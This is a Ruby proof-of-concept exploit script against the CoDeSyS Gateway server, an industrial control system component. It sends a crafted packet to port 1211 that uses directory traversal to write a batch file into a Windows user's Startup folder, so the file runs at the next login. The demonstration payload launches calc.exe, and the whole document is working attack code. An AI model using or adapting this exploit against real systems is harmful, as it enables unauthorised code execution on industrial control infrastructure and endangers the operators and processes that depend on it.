#!/usr/bin/env ruby
# Tested against PLCDesigner V2.6.3.7/CoDeSyS Gateway.exe 2.3.9.21
# https://raw.githubusercontent.com/rapid7/metasploit-framework/master/modules/exploits/windows/scada/codesys_gateway_server_traversal.rb

require 'rex'

host = ARGV[0]

def usage 
	puts "[*] #{$0} <host>"
	exit
end

usage if ARGV.size < 1

begin
sock = Rex::Socket::Tcp.create('PeerHost'  => host, 'PeerPort'  => 1211)

magic_code = "\xdd\xdd"
opcode = [6].pack('L')

local_filedata = "calc.exe"

file = "..\\..\\"
# select a users path...
file << "Users\\mc\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\" 
file << "calc.bat"
file << "\x00"

pkt_size = local_filedata.size() + file.size() + (0x108 - file.size()) + 4

pkt = magic_code << Rex::Text.rand_text_alpha_upper(12) << [pkt_size].pack('L')

tmp_pkt = opcode << file
tmp_pkt += "\x00"*(0x108 - tmp_pkt.size) << [local_filedata.size].pack('L') << local_filedata
pkt << tmp_pkt


sock.write(pkt)
rescue => e
puts "[!] #{e.to_s}"
end



